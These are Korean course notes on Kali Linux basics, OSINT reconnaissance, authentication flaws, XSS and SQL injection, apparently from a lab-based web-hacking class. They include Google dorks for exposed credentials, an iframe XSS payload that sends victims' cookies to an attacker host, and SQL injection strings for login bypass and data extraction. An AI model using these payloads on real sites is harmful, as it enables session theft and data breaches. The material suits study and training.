
## 웹 프록시 서버의 역할
```
개인 PC(브라우저) ---> 요청(Request) ---> 웹 프록시 서버 (캐시 서버) ---------------> 서버(인터넷)
                 <--- 응답(Response)                             <- 응답(Response)
```

---

## BurpSuite 도구
```
```

---

## 칼리 리눅스 명령어 정리 - 사용자 정보와 디렉터리 확인

### 1) id

- 현재 사용자(혹은 지정한 사용자)의 UID, GID, 소속 그룹들을 보여줌.

- **사용법**: id 또는 id username

- **예시 출력**
```bash
$ id
uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),27(sudo)
```
- **의미**: uid=사용자ID(사용자이름), gid=기본그룹, groups=소속 그룹 목록

---

### 2) pwd

- 현재 작업 중인 절대 경로(현재 디렉토리) 출력

- **사용법**: pwd

- **예시**
```bash
$ pwd
/home/kali
```

---

### 3) ls

- 디렉토리의 파일/폴더 목록을 나열

- **자주 쓰는 옵션**
```
ls : 기본 목록
ls -a : 숨김파일(.으로 시작) 포함
ls -l : 상세(long) 형식 (권한, 소유자, 크기, 수정시간 등)
ls -al 또는 ls -la : 숨김파일 포함 + 상세 출력
```

---

### 4) ls -al시 나오는 권한

- **예시 한 줄:**
```bash
-rw-r--r--  1 kali users  4096 Sep 29 10:00 example.txt
```
```
각 부분 설명(왼쪽부터):

-rw-r--r-- — 파일 타입 + 권한 비트
첫 문자: - 파일, d 디렉토리, l 심볼릭 링크 등
다음 9문자: 소유자(owner) / 그룹(group) / 기타(other) 권한, 각각 r(읽기), w(쓰기), x(실행)
예: rw- (소유자 읽기+쓰기), r-- (그룹 읽기만), r-- (그 외 읽기만)
1 — 하드링크 수(디렉토리는 항목 수 등)
kali — 소유자 (owner)
users — 그룹 (group)
4096 — 파일 크기(바이트)
Sep 29 10:00 — 마지막 수정 시각
example.txt — 파일 이름

권한을 숫자로 표시하면: rwxrwxrwx → 각각 4(r)+2(w)+1(x) 해서 owner/group/other 세 자리로 755, 644 등.

예: -rw-r--r-- = owner rw-(6), group r--(4), other r--(4) → 644
```

---

### 5) /home 디렉토리란?

- 시스템 사용자들의 홈 디렉토리들이 모여 있는 기본 위치

- **흔한 구조**:
```
/home/
  ├─ alice/    (alice의 홈)
  ├─ bob/      (bob의 홈)
  └─ kali/
```
- 각 사용자는 자신의 홈(/home/username)에 개인 설정 파일(.bashrc, .profile 등)과 데이터 파일을 둠.

- 루트 사용자 홈은 보통 /root 임.

---

### 6) sudo su -

- 현재 사용자가 root(관리자) 권한의 로그인 쉘로 전환

- **동작**
```
sudo : 명령을 다른 사용자(기본 root) 권한으로 실행
su - : 해당 사용자(root)의 로그인 환경(환경 변수, 홈 디렉토리 등)을 로드한 쉘 실행
합치면 sudo su -는 root로 완전하게 로그인하는 것과 동일
```
- **사용 예**
```bash
$ sudo su -
# whoami
root
# pwd
/root
```
- 주의: root 권한은 시스템 전체를 변경할 수 있으니 신중하게 사용. 가능하면 sudo command 형식으로 필요한 명령만 권한 상승해서 쓰는 게 안전.

---

## 칼리리눅스 명령어 기본 - apt 패키지 관리

### 1) sudo apt update

- 패키지 목록(업데이트 가능한 패키지 정보)을 최신으로 갱신

### 2) sudo dhclient

- DHCP 서버로부터 IP 주소 자동 할당

### 3) sudo apt install vsftpd

- FTP 서버 프로그램(vsftpd) 설치

### 4) sudo apt search vsftp

- 패키지 목록에서 vsftp 관련 패키지 검색

### 5) sudo apt show vsftpd

- vsftpd 패키지의 상세 정보 확인 (버전, 설명, 의존성 등)

### 6) sudo apt list --installed

- 설치된 패키지 전체 목록 출력

### 7) sudo apt list --installed | grep ftp

- 설치된 패키지 중 ftp 관련된 것만 필터링

### 8) sudo apt remove vsftpd

- vsftpd 패키지 제거 (설정파일은 남음)

### 9) sudo apt install fonts-nanum

- 한글 글꼴 나눔폰트 설치

---

## 칼리리눅스 명령어 기본 - 사용자 추가 및 권한 부여

### 1) sudo useradd -d /home/kali2 -m kali2
```
useradd : 새로운 시스템 사용자 계정 생성(저수준).
-d /home/kali2 : 홈 디렉터리 경로를 /home/kali2로 지정.
-m : 지정한 홈 디렉터리를 만들어 줌(존재하지 않으면 생성).
kali2 : 생성할 사용자 이름.
```
- 주의: useradd는 보통 암호를 설정하지 않음 → 다음에 sudo passwd kali2로 비밀번호 설정 필요.

### 2) sudo usermod -a -G sudo kali2 
```
usermod : 기존 사용자 수정.
-G sudo : sudo 그룹에 추가(대상 그룹 지정).
-a : append — 기존 그룹 목록을 덮어쓰지 않고 추가.
```
- 주의: a 없이 -G만 쓰면 사용자가 소속된 그룹 목록이 해당 옵션으로 대체되어 버릴 수 있음

- 결과: kali2가 sudo 그룹의 멤버가 되면, 보통 sudo <command>로 관리자 권한을 쓸 수 있음 (배포판 설정에 따라 다름—우분투 계열은 sudo 그룹이 관리자 권한).

### 3) sudo chsh -s /bin/bash kali2
```
chsh : 사용자 계정의 로그인 셸(login shell) 변경.
-s /bin/bash : 사용할 셸 경로를 /bin/bash로 설정.
kali2 : 대상 사용자.
```
- 변경 대상 셸은 /etc/shells에 등록된 경로여야 함(그렇지 않으면 실패할 수 있음).

- 셸 변경은 다음 로그인부터 적용(또는 su - kali2로 즉시 확인 가능).

### 4) sudo passwd kali2

- useradd로 계정 만들고 나면 비밀번호가 없거나 잠긴 상태일 수 있음.

- passwd로 비밀번호 지정(또는 잠금 해제).

### 5) 배쉬(Bash) vs 제트(Zsh) — 간단 비교

- Bash (Bourne Again SHell)
```
1) 널리 사용되고 대부분 시스템에 기본으로 설치되어 있음.
2) 스크립트 호환성이 좋고 학습/디버깅이 쉬움.
3) 안정적이고 표준적.
```

- Zsh (Z shell)
```
1) 더 풍부한 기능(향상된 탭 완성, 글로브 확장, 테마/플러그인 풍부).
2) oh-my-zsh 같은 프레임워크로 생산성/시각적 편의성 향상 가능.
3) 기본 설치는 안 되어 있을 수 있으므로 sudo apt install zsh 필요.
4) 셸을 바꾸려면 chsh -s /bin/zsh kali2 (그리고 /etc/shells에 /bin/zsh가 있어야 함).
```

- 추천(간단): 초반엔 bash로 익숙해지는 걸 추천 (스크립트/문제 해결에 유리).

---

## 칼리리눅스 명령어 기본 - vim 파일편집

### 1) 파일 다루기 (cat)
```
cat > test.txt
```
- 새로운 파일 생성 후 입력 (기존 내용 덮어씀)
```
cat >> test.txt
```
- 기존 파일 끝에 내용 추가(append)

### 2) vi/vim 편집기 기본
```
vim test2.txt
```
- test2.txt 파일 열기

**입력 모드**
- i : Insert 모드 진입 → 텍스트 입력 가능

**저장 & 종료**
- ESC + :wq! : 저장하고 강제 종료

**편집 기능**
- dd : 현재 줄 삭제

- :set nu : 줄 번호 표시

**복사/붙여넣기 (터미널 단축키)**
- Ctrl + Shift + C : 복사

- Ctrl + Shift + V : 붙여넣기

---

## 칼리리눅스 명령어 기본 - find, locate 명령어

### 1) locate ftp [-c]

- 파일 DB에서 ftp가 들어간 경로 빠르게 검색

- -c : 결과 개수만 출력

- DB 기반 → 최신화 필요: updatedb(locate가 사용하는 파일 경로 DB 갱신)

- man locate : locate 사용법 매뉴얼 확인

### 2) find 주요 명령어
```
find 명령어(실제 파일시스템에서 직접 검색)

find / -name "ftp"
-> 루트(/) 아래에서 이름이 정확히 "ftp"인 파일 검색

find / -name "*ftp*"
-> 이름에 ftp가 포함된 모든 파일 검색

find / -type d -name "ftp"
-> 이름이 "ftp"인 디렉터리 검색

find /home -user kali -name "*.txt"
-> /home 밑에서 kali 사용자가 가진 .txt 파일 검색

find / -mtime +7 -name "*.txt"
-> 7일 이전에 수정된 .txt 파일 검색

find / -size +10M -name "*.txt"
-> 크기가 10MB 이상인 .txt 파일 검색
```

### 3) fdisk -l

- 디스크 파티션/용량 정보 확인 (root 권한 필요)

---

## 칼리리눅스 명령어 기본 - dpkg 패키지 관리

### 1) apt와 dpkg 차이
```
[dpkg]
저수준 패키지 관리 도구
.deb 패키지를 직접 설치/제거/조회
의존성 자동 해결 X (수동으로 처리해야 함)

[apt]
고수준 패키지 관리 도구
dpkg를 내부적으로 사용
저장소에서 패키지를 내려받고, 의존성 자동 해결 가능
```

### 2) dpkg 주요 명령어
```
dpkg -l
-> 설치된 패키지 목록 출력

dpkg -L apache2
-> 특정 패키지가 설치한 파일 경로 목록 확인

dpkg -s vsftpd
-> 특정 패키지의 상태/정보 확인

dpkg -r vsftpd
-> 패키지 제거 (설정 파일은 남음)

dpkg -P vsftpd
-> 패키지 완전 제거 (설정 파일까지 삭제)

dpkg -I
-> .deb 파일의 정보 조회 (설치 X, 내용만 확인)

dpkg -i
-> .deb 파일 설치
```

### 3) 주요 디렉터리 용도

**/usr/share**

- 공용 데이터 (아이콘, 문서, 매뉴얼, 지역화 파일 등)

- 실행파일은 아님, 주로 읽기 전용 리소스

**/usr/sbin**

- 시스템 관리용 실행 파일 (관리자 명령어: apache2, vsftpd 등)

**/etc**

- 시스템/프로그램 설정 파일 저장 위치

- 예: /etc/passwd, /etc/ssh/sshd_config, /etc/apache2/

---

## OSINT를 활용한 정보 수집 단계 - whois, dns 정보 확인

### 1) OSINT(Open Source Intelligence)

- 공개된 정보(오픈소스 데이터)를 수집·분석해 유용한 인텔리전스로 활용하는 것

- 대상: 웹사이트, 도메인, SNS, 검색엔진, 공개 DB 등

### 2) 관점별 OSINT 활용

**offensive 관점(공격자 입장)**

- 공격 전에 목표 시스템/조직의 정보를 수집 → 취약점 찾기

- 예: 도메인 정보, 서버 IP, 이메일, 네트워크 구조, 직원 SNS 정보

**defensive 관점(방어자 입장)**

- 공격자가 노릴 수 있는 공개된 정보 노출을 줄이고 관리

- 예: DNS 설정 점검, WHOIS 정보 보호, 불필요한 서비스/포트 차단

### 3) 주요 명령어 & 도구

**whois -H domain.com**

- 도메인 등록자, 네임서버, 만료일 등 조회

- -H : 긴 출력(약관/경고문) 숨기고 깔끔하게 보기

**DNS 정보 수집**

[fierce]

- 도메인 기반 DNS 수집/브루트포스 도구

- 예: fierce -dns *.google.com → 구글 관련 서브도메인 수집

[recon-ng]

- OSINT 프레임워크 (모듈 기반)

- 다양한 API/데이터 소스로 자동화된 정보 수집

한 가지 도구를 100% 신뢰할 수 없음

여러가지 취약점 분석 도구를 사용하며 비교/분석 하면서 명확하게 찾아낼 필요가 있음.

---

## OSINT를 활용한 정보 수집 단계 - 해킹 할 때 서브도메인(subdomain) 검색 방법 및 중요성

### 1) 검색 연산자 (Google 검색에서)

**site:google.com -site:www.google.com**

- -> google.com 도메인에 속하지만 www.google.com은 제외한 결과 검색.

**filetype:xls**

- -> 파일 형식이 .xls (엑셀 97-2003)인 결과만 검색.

### 2) Kali에서 쓰는 DNS / 서브도메인 수집 도구
```
dig — DNS 조회(레코드 직접 질의).
host — 간단한 DNS 조회 도구.
nslookup — 전통적 DNS 조회(상호작용 모드 가능).
dnsenum — 서브도메인/NS/존 전송 시도 등 자동화 수집.
dnsrecon — 다양한 DNS 레코드 수집·열거 기능.
fierce — 서브도메인 브루트·열거 도구.
amass — 대규모 서브도메인 수집·연결지도 생성 (외부 데이터 연동).
sublist3r — 서브도메인 열거(빠르고 간단).
massdns — 대량 DNS 쿼리/검증(속도 위주).
nmap --script dns-* — DNS 관련 스크립트로 정보 수집/검증.
(도구 선택은 목적·속도·정확도에 따라 달라짐.)
```

### 3) DNSdumpster.com

- 온라인 DNS/호스트 매핑 시각화 서비스.

- 도메인 입력하면 공개된 네임서버, 서브도메인, 호스트 정보를 시각적으로 보여줌.

- 빠른 초기 정찰에 유용(단, 결과는 공개/캐시된 정보 한정).

### 4) “subdomain bug hunting” (서브도메인 버그헌팅)

- **목적:** 허가된 범위(버그바운티/내부 점검)에서 서브도메인들을 찾아서 취약점·노출된 서비스를 발견.

- **흔한 타깃:** 미노출 관리 패널, 오래된 앱, 취약한 API 등.

- 도구 + CT 로그(crt.sh 등) + 검색 연산자 조합으로 탐색.

### 5) Facebook Tools — CT (Certificate Transparency)

- **의미:** 메타(Facebook)가 제공하는 Certificate Transparency(CT) 모니터링 툴.

- **기능:** 도메인에 대해 발급된 TLS 인증서 로그를 검색하고, 새로 발급되는 인증서에 대해 알림(구독) 설정 가능 -> 위조/오발급된 인증서 탐지에 도움.

---

## OSINT를 활용한 정보 수집 단계 - OSINT의 대표적인 사이트 urlscan을 이용한 홈페이지 정보 획득

### 1) urlscan.io
```
웹페이지를 브라우저처럼 실시간 스캔하여 HTML, 리소스(이미지/JS/CSS), 요청·응답 헤더, 스크린샷, 도메인/서브도메인 관계 등을 저장·시각화해주는 온라인 서비스.

[주요 기능]
URL 제출 → 페이지 렌더링 결과(네트워크 호출, 외부 도메인 호출, 스크린샷) 확인
공개 스캔 인덱스에서 키워드/필드로 검색 가능
API 제공(자동화 검색/분석)

[활용(Offensive / Defensive)]
Offensive: 타깃 페이지의 외부 리소스(추적·서드파티 스크립트), 잠재적 민감정보 노출 파악.
Defensive: 사이트에 포함된 외부 스크립트·서드파티 호출 검증, 피싱·리디렉션 탐지, 콘텐츠 변경 모니터링.

[예시 (검색식)]
page.domain:"example.com" — example.com 도메인에서 스캔된 페이지들 필터링
url:"https://example.com/login" — 특정 URL로 스캔된 결과 검색

(웹 UI 또는 API의 검색 필드에 위와 같은 쿼리를 넣어 사용)
```

### 2) page.domain="..." (검색식 의미)
```
urlscan 등 검색 인터페이스에서 사용하는 필드 기반 쿼리 표현. page.domain:"example.com" 은 스캔된 페이지의 도메인이 example.com인 항목만 찾겠다는 뜻.

[응용 예]
page.domain:"example.com" AND page.statuscode:200 — 응답 코드 200인 결과만 보기
page.domain:"example.com" AND page.screenshot:true — 스크린샷이 있는 스캔만 필터링
```

### 3) Censys
```
인터넷 상의 호스트(또는 인증서·서비스)를 대규모로 스캔·인덱싱해 검색·분석할 수 있게 해주는 플랫폼(검색 엔진 + 데이터베이스). SSL/TLS 인증서, 서비스 포트, 응답 헤더, 운영체제 정보 등을 제공.

[주요 기능]
IPv4/IPv6 호스트 검색, 서비스별(HTTP, SSH 등) 검색
TLS 인증서 인덱스(발급된 인증서 검색)
쿼리언어로 정교한 필터링 가능, API 제공

[활용(Offensive / Defensive)]
Offensive: 특정 포트·서비스가 공개된 호스트 식별(취약 버전 탐지 등).
Defensive: 자사 자산(공개 IP, 노출된 서비스, 잘못된 인증서 등) 모니터링 및 식별.

[예시 쿼리]
services.service_name: "http" AND services.http.response.headers.server: "nginx" — HTTP 서비스 중 서버 헤더가 nginx인 호스트
parsed.extensions.subject_alt_name.dns_names: "example.com" — 인증서의 SAN에 example.com이 포함된 항목

[접근]
웹 UI로 탐색, API/키로 자동화 조회 가능(쿼리·결과 다운로드 지원).
```

---

## OSINT를 활용한 정보 수집 단계 - archive 사이트 활용과 robots 파일 이해

### 1) Internet Archive / Wayback Machine

- 과거 웹페이지의 스냅샷(아카이브)을 저장·검색하는 서비스. archive.org가 운영.

- **사용처:** 사이트의 과거 버전 확인, 증거 보존, 리서치 등.

**Wayback에서 스냅샷을 삭제하려면 (요약 절차)**

**1. 자신이 사이트 소유자라면**

- 우선 원본 사이트에서 문제되는 페이지(또는 민감정보)를 삭제하거나 수정.

- 사이트에 robots.txt 또는 <meta name="robots" content="noindex,nofollow"> 등을 설정해 향후 크롤링/캐시를 막음(검색엔진·아카이브 차단용).

**2. Internet Archive에 삭제 요청 제출**

- Archive의 'contact / takedown' 또는 'remove a capture' 양식으로 구체적 스냅샷 URL, 삭제 이유, 소유 증명(가능하면)을 제출.

- 개인정보·저작권·법적 문제 등 정당한 사유가 있으면 처리 가능.

**3. 법적·긴급 사유**가 있으면 해당 근거(documentation)를 함께 제출하면 빠를 수 있음(예: 개인정보 노출, 법적 판결 등).

**4. 결과 대기:** Archive 운영 정책·검토 절차에 따라 처리. (정책·절차는 수시로 바뀔 수 있으니 archive.org의 공식 도움말/양식 참고)

### 2) robots.txt

- 사이트 루트(/robots.txt)에 크롤러가 접근해 어떤 경로를 수집해도 되는지 알려주는 표준 텍스트 파일.

```makefile
User-agent: *
Disallow: /private/
```

- **효과:** 대부분의 좋은 크롤러(검색엔진·일부 아카이브)는 이를 존중해서 해당 경로를 수집하지 않음.

- **주의:** 모든 크롤러가 강제적으로 따르는 것은 아니며(악성 스캐너는 무시 가능), 이미 수집된 스냅샷을 자동으로 삭제해주진 않음 — 사후 조치(제출 요청)가 필요함.


### 3) 구글의 '저장된 페이지'(캐시) 및 유사 페이지

- 구글 저장된 페이지(캐시): 구글이 마지막으로 인덱싱했을 때의 페이지 사본.

- **삭제/갱신 방법:**

- **사이트 소유자:** 페이지에 noindex 메타태그 추가 → Google Search Console에서 URL 제거(Removals) 도구로 임시 제거 요청.

- **개인정보·법적 이유:** Google의 개인정보 삭제 요청 양식 사용.

- **유사한 페이지(Similar pages):** 검색 결과에서 특정 페이지와 유사한(내용·구조가 비슷한) 페이지를 보여주는 기능 — 직접적인 삭제 수단은 아님.

### 4) httrack

- 웹사이트 전체(또는 일부)를 로컬로 복제(다운로드) 하는 도구 — 오프라인 열람 또는 분석용.

```
httrack "https://example.com" -O /path/to/save "+*.example.com/*" -v

-O : 저장 위치 지정
"+*.example.com/*" : example.com 내부 링크만 포함
-v : 자세한 로그(verbosity)
```

- 중요 옵션(주의):

- **--robots=0 :** robots.txt 무시하고 강제로 다운 → 비윤리적/불법적일 수 있음(절대 무단으로 사용 금지).

- **윤리:** 타사 서버에 과도한 부하를 주지 않도록 --wait·--limit-rate 같은 옵션으로 요청 속도를 조절하거나, 사전 허가를 받아 사용하여야 함.

---

## OSINT를 활용한 정보 수집 단계 - 구글(google) 해킹 이해 (1)

### 1) site:google.com -site:www.google.com
```
google.com 도메인에 속하는 페이지들 중에서 www.google.com(즉 www 서브도메인)은 제외하고 검색하라는 뜻.

[용도/예시 결과]
mail.google.com, accounts.google.com, developers.google.com 같은 비-www 서브도메인 결과를 볼 때 유용.

[비고(정확성)]
site: 연산자는 도메인/서브도메인 기반 필터링. -site:는 제외 연산자.

[예시 (같은 뜻, 더 구체적)]
site:google.com -site:www.google.com "login" → non-www 서브도메인 중 login 포함 페이지 찾기
```

### 2) allinurl:trello.com "Username:" "Password:" "Type:"
```
URL(주소)에 특정 단어들이 모두 포함된 결과만 보여달라는 구문. 작성하신 형태는 URL에 trello.com이 포함되고, 페이지 내에서 "Username:" "Password:" "Type:" 같은 문구를 포함하는 페이지를 찾으려는 시도.

[실제 동작(주의)]
allinurl: 뒤에 오는 단어들은 모두 URL(주소)에 포함되어야 검색됨.
"Username:" 등은 따옴표로 감싼 본문(페이지 내용) 검색어와 결합하면 기대한 대로 동작하지 않을 수 있음.

[더 정확한 쿼리(권장)]
site:trello.com intext:"Username:" intext:"Password:" intext:"Type:"
-> 트렐로 도메인 내에서 본문에 해당 키워드들이 들어간 페이지를 찾음.

또는 inurl:trello.com intext:"Username:" 등으로 조합 가능.

[의도(보안적 의미)]
이런 검색은 공개적으로 노출된 자격증명 템플릿(또는 실수로 올라간 크리덴셜) 등을 찾는 데 사용될 수 있음.
```

### 3) ext:action intext:"Struts Problem Report"
```
.action으로 끝나는 URL(예: Struts 프레임워크의 엔드포인트)을 찾고, 페이지 본문에 "Struts Problem Report"(Struts 예외/오류 페이지 텍스트)가 포함된 결과를 찾으려는 구문.

[구문 설명 / 올바른 형태]
ext:는 일부 검색 엔진에서 filetype:의 대체로 쓰였던 적 있으나, 안정적으로 동작하지 않을 수 있음.

[더 확실한 쿼리]
inurl:.action intext:"Struts Problem Report"
-> URL에 .action을 포함하고, 본문에 Struts 오류 메시지가 있는 페이지 검색

[의도/활용]
Offensive 관점: 공개된 Struts 오류 페이지는 디버그 정보(스택트레이스, 클래스명, 파라미터 등)를 노출할 수 있어 취약점 탐지에 이용됨.
Defensive 관점: 자사 서비스가 오류 페이지로 민감정보를 노출하는지 확인하는 데 유용.
```

---

## OSINT를 활용한 정보 수집 단계 - 구글(google) 해킹 이해 (2)

FOCA

---

## 인증 처리 미흡 취약점 - 인증 처리 미흡 취약점 이해

인증 처리 미흡 취약점이란?

웹 서비스 취약점 진단

인증 우회

관리자 페이지 추측

URL 강제 호출

세션 예측

불충분한 인가

관리자페이지 노출

경로 추적

관리자 페이지 접근

파라미터 값 변조

---

## 인증 처리 미흡 취약점 - OWASP ZAP 자동 웹 스캔 점검 (1)

passive (수동적)

Active (공격적)

강제 검색

---

## 인증 처리 미흡 취약점 - OWASP ZAP 자동 웹 스캔 점검 (2)

---

## 인증 처리 미흡 취약점 - 관리자 쿠키 정보 미흡

---

## 인증 처리 미흡 취약점 - 취약한 로그인 페이지

---

## 인증 처리 미흡 취약점 - 다른 사용자 게시물 수정 (1)

인증 처리 미흡

A 사용자(Chrome) - B 사용자(IEX)

A 사용자 -> 관리자 권한

submit button -> form -> action

다른 사용자(B 사용자)의 게시물 수정, 삭제 가능?
1:1 문의 게시판, 비공개 글은 보기 가능?

다른 사용자의 주문정보(개인정보 포함?)

burpsuite 이용

---

## 인증 처리 미흡 취약점 - 다른 사용자 게시물 수정 (2)

---

### 인증 처리 미흡 취약점 - 대응 방안 제시

인증 및 세션 처리 미흡 - 관리자 페이지 접근 제한 (php 환경)

인증 및 세션 처리 미흡 - 회원 가입 시 회원 가입 불가 아이디 설정

인증 및 세션 처리 미흡 - 다른 사용자 게시물 수정 가능 제한

인증 및 세션 처리 미흡 - 상품 가격 조작

머리에는 인증, 몸, 발바닥에는 에러처리

---

### 웹 해킹 이해 - XSS 취약점 이해

XSS?

공격자  ------  사용자  ------ 악성코드 배포사이트
악의적인 스크립트 삽입  악성코드 스크립트 실행
                       악성코드 감염
                      랜섬웨어 감염 개인정보 유출 등

피싱 사이트 유도

---

### 웹 해킹 이해 - XSS 공격 기법 이해

Stored XSS

Refleced XSS

---

### 웹 해킹 이해 - Stored XSS 취약점 실습

```
<script>alert(1);</script>
<script>alert("xss");</script>
<script>alert(document.cookie);</script>
```

---

### 웹 해킹 이해 - Stored XSS 취약점을 이용한 쿠키 재사용 공격

Stored XSS -> 어떤 공격을 할 수 있나?

1. 쿠키 정보(alerrt(document.cookie) - Victim(희생자-일반사용자, 관리자) 쿠키 -> 공격자 서버

2. 쿠키 재사용 공격 (Replay Attack)
- http-only
- 쿠키 생성할 때: IP주소 + 쿠키 -> 암호화
                 MAC 주소, 하드웨어의 일부 정보
  
3. ActiveX -> exe, dll -> Non - ActiveX -> 통합 프로그램(exe)

<script>alert(1);</script>
<script>alert(document.cookie);</script>
<iframe src='http://192.168.206.154/cookie.php?cookie="+document.cookie+"'width=0 height=0></iframe>

---

### 웹 해킹 이해 - BXSS Hunter를 활용한 사용자 쿠키 정보 획득

BXSS Hunter

---

### 웹 해킹 이해 - Stored XSS 취약점을 이용한 관리자 권한 상승

1:1 문의 게시판 - 1:1 쪽지 - 1:1 문의 채팅...

TEXT 형식의 글에서도 관리자쪽에서 발생할 수 있다.

블랙박스 - 리얼해킹...

사용자 -> 관리자 권한을 위해..

xss cheat sheet

브라우저별로, 버전별...

---

### 웹 해킹 이해 - Reflected XSS 취약점 실습

Reflected XSS?

---

### 웹 해킹 이해 - Burp Suite Intruder를 활용한 XSS 취약점 진단

Burp Suite Intruder 기능 사용법

---

### SQL Injection 공격 - SQL Injection 공격 이해 이론

SQL Injection?

- SQL Query를 처리하는 과정에서 예상치 못한 입력 값에 의해 DBMS 정보 노출, 특정 명령어 실행 등이 발생하는 취약점

- 공격자는 정상적인 값 대신 자신이 원하는 값을 웹에 요청하고, 웹은 데이터베이스에 요청을 한 뒤 결과 값이 웹을 통해 노출되거나 유추할 수 있는 형태로 출력됨

```
      원하는 데이터 요청        데이터 전달
공격자 --------------->  WEB ---------------> 데이터베이스
      <---------------      <---------------
       웹에 결과값 출력          결과 전달
```

**SQL Injection 대표적인 해킹 사례**

- '여기어때' 의 마케팅 관리 웹서버에서 입력 값 검증 미흡으로 인해 관리자 세션 값 탈취 및 개인정보 99만건 유출이 발생함

**SQL Injection을 이용한 인증 우회**

- 인증 처리 프로세스에서 '참' 값을 만들어주면서 정상적인 계정 정보 입력을 우회하게 됨
```
'or 'x'='x
" or "x" = "x
') or ('x'='x
") or ("x"="x
```

**Error Based SQLi 을 이용한 데이터베이스 정보 획득**

- 웹을 통해서 데이터베이스의 원하는 값을 하나씩 가져와 중요정보 획득
```
0' UNION SELECT ALL 1, concat(id,login,password),3,4,concat(email,secret),6,7 from users#
```

**Blind SQLi을 이용한 데이터베이스 정보 추측 및 획득**

- 웹에서 데이터베이스의 에러 정보가 노출되지 않기 때문에 "참"과 "거짓"으로 정보 추측, 획득
```
'or 1=1 and length(database())=5#
```


**SQL Injection - Blind - Boolean-Based**
```
'or 1=1 and substring(database(),1,1)='b'#
'or 1=1 and ascii(substring(database(),1,1))=98#
```

**Time Based SQLi을 이용한 데이터베이스 정보 추측 및 획득**

- sleep() 함수를 이용하여 데이터베이스 스레드 동작 정지 여부를 보고 판단
```
'or 1=1 and sleep(5)#
'or 1=1 and length(database())=5 and sleep(5)#
'or 1=1 and substring(database(),1,1)='b' and sleep(5)#
```

---

### SQL Injection 공격 - Error-Based SQL Injection

